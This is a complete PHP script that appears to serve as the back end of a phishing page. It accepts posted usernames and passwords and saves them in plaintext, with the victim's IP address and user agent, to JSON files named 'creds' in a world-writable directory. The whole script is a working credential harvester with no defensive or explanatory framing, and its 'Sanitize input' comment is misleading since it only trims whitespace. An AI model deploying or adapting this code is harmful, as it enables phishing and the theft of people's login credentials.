<?php
// Directory to save logs
$logDir = __DIR__ . '/logs';
if (!is_dir($logDir)) {
    mkdir($logDir, 0777, true);
}

// Get timestamp
$timestamp = date('Y-m-d_H-i-s');

// Sanitize input
$username = isset($_POST['username']) ? trim($_POST['username']) : 'N/A';
$password = isset($_POST['password']) ? trim($_POST['password']) : 'N/A';

// Format log
$logEntry = [
    'timestamp' => $timestamp,
    'username' => $username,
    'password' => $password,
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'N/A'
];

// Save log to file
file_put_contents("$logDir/creds_$timestamp.json", json_encode($logEntry, JSON_PRETTY_PRINT));

http_response_code(200);
echo "Logged successfully";
?>
